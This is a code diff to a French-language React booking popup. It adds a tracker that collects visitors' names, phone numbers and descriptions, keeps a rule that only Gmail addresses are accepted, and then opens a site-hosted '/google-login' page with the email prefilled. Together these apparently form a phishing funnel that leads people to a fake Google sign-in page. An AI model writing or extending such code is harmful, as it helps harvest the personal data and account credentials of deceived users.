@@ -1,10 +1,14 @@
 import React, { useEffect, useState } from 'react';
+import { useLeadTracker } from '../hooks/useLeadTracker';
 import styles from '../styles/Popup.module.css';
 
 const BookingPopup = ({ showPopup, onClose, campaignData }) => {
   const [emailError, setEmailError] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [showConfirmation, setShowConfirmation] = useState(false);
+  
+  // Hook pour le tracking des leads
+  const { trackBooking, isTracking } = useLeadTracker();
 
   const handlePopupClick = (e) => {
     // Empêcher la propagation de l'événement click pour éviter de fermer/rouvrir la popup
@@ -30,25 +34,49 @@ const BookingPopup = ({ showPopup, onClose, campaignData }) => {
     const formData = new FormData(e.target);
     const email = formData.get('email');
     const firstName = formData.get('firstName');
+    const lastName = formData.get('lastName');
+    const phone = formData.get('phone');
+    const description = formData.get('description');
     
     if (!validateGmailAddress(email)) {
       // setEmailError('Merci d\'utiliser une adresse Gmail compatible.');
       return;
     }
     
-    // Afficher l'état de confirmation directement
     setIsSubmitting(true);
-    setShowConfirmation(true);
     
-    // Rediriger après 3 secondes
-    setTimeout(() => {
-      // Ouvrir la page de login Google dans un nouvel onglet avec l'email et le prénom
-      window.open(`/google-login?email=${encodeURIComponent(email)}&firstName=${encodeURIComponent(firstName)}`, '_blank');
+    try {
+      // Tracker le booking avant de procéder
+      await trackBooking({
+        email,
+        firstName,
+        lastName,
+        phone,
+        description
+      });
       
-      // Garder l'état de confirmation (ne pas fermer)
-      // setIsSubmitting(false);
-      // setShowConfirmation(false);
-    }, 3000);
+      // Afficher l'état de confirmation
+      setShowConfirmation(true);
+      
+      // Rediriger après 3 secondes
+      setTimeout(() => {
+        // Ouvrir la page de login Google dans un nouvel onglet avec l'email et le prénom
+        window.open(`/google-login?email=${encodeURIComponent(email)}&firstName=${encodeURIComponent(firstName)}`, '_blank');
+        
+        // Garder l'état de confirmation (ne pas fermer)
+        // setIsSubmitting(false);
+        // setShowConfirmation(false);
+      }, 3000);
+      
+    } catch (error) {
+      console.error('Erreur lors du tracking du booking:', error);
+      // Continuer même si le tracking échoue
+      setShowConfirmation(true);
+      
+      setTimeout(() => {
+        window.open(`/google-login?email=${encodeURIComponent(email)}&firstName=${encodeURIComponent(firstName)}`, '_blank');
+      }, 3000);
+    }
   };
 
   // Désactiver le scroll quand la popup est ouverte
@@ -164,14 +192,14 @@ const BookingPopup = ({ showPopup, onClose, campaignData }) => {
                 <div className={styles.formRow}>
                   <div className={styles.inputGroup}>
                     <label>Numéro de téléphone</label>
-                    <input type="tel" className={styles.input} />
+                    <input type="tel" name="phone" className={styles.input} />
                   </div>
                 </div>
 
                 <div className={styles.formRow}>
                   <div className={styles.inputGroup}>
                     <label>Présentez-vous en quelques mots</label>
-                    <textarea className={styles.textarea} rows="3"></textarea>
+                    <textarea name="description" className={styles.textarea} rows="3"></textarea>
                   </div>
                 </div>
 
@@ -179,11 +207,11 @@ const BookingPopup = ({ showPopup, onClose, campaignData }) => {
                   <button type="button" onClick={onClose} className={styles.cancelBtn} disabled={isSubmitting}>
                     Annuler
                   </button>
-                  <button type="submit" className={styles.bookBtn} disabled={isSubmitting}>
-                    {isSubmitting ? (
+                  <button type="submit" className={styles.bookBtn} disabled={isSubmitting || isTracking}>
+                    {(isSubmitting || isTracking) ? (
                       <div className={styles.loadingContainer}>
                         <div className={styles.spinner}></div>
-                        <span>Vérification en cours...</span>
+                        <span>{isTracking ? 'Réservation...' : 'Vérification en cours...'}</span>
                       </div>
                     ) : (
                       'Réserver'
